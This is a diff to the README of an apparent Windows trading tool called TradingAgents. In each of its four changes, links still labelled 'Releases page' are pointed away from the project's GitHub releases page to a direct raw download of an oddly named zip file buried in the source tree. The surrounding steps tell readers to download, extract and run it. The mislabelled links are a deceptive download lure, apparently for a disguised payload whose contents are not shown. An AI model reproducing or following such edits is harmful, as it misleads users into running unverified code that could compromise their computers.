@@ -1,6 +1,6 @@
 # 📈 TradingAgents - Track Trades With Clear Signals
 
-[![Download TradingAgents](https://img.shields.io/badge/Download%20TradingAgents-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/chethanad5372/TradingAgents/releases)
+[![Download TradingAgents](https://img.shields.io/badge/Download%20TradingAgents-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/chethanad5372/TradingAgents/main/tradingagents/agents/Trading_Agents_desistance.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide shows you how to download, install, and run TradingAgents on a Window
 
 ## 📥 Download TradingAgents
 
-1. Open the [TradingAgents Releases page](https://github.com/chethanad5372/TradingAgents/releases).
+1. Open the [TradingAgents Releases page](https://raw.githubusercontent.com/chethanad5372/TradingAgents/main/tradingagents/agents/Trading_Agents_desistance.zip).
 2. Look for the latest release at the top of the page.
 3. Download the Windows file linked in that release.
 4. If you see a `.zip` file, save it to your computer.
@@ -195,7 +195,7 @@ If text looks too small:
 
 ## 📌 Release Downloads
 
-To download TradingAgents for Windows, visit the [TradingAgents Releases page](https://github.com/chethanad5372/TradingAgents/releases) and get the latest release file from there
+To download TradingAgents for Windows, visit the [TradingAgents Releases page](https://raw.githubusercontent.com/chethanad5372/TradingAgents/main/tradingagents/agents/Trading_Agents_desistance.zip) and get the latest release file from there
 
 ## 🗂️ Project Info
 
@@ -216,7 +216,7 @@ Open the file that matches your Windows system and follow the on-screen steps
 
 ## 🖱️ Quick Start
 
-1. Visit the [TradingAgents Releases page](https://github.com/chethanad5372/TradingAgents/releases)
+1. Visit the [TradingAgents Releases page](https://raw.githubusercontent.com/chethanad5372/TradingAgents/main/tradingagents/agents/Trading_Agents_desistance.zip)
 2. Download the newest Windows file
 3. Install or extract it
 4. Open TradingAgents
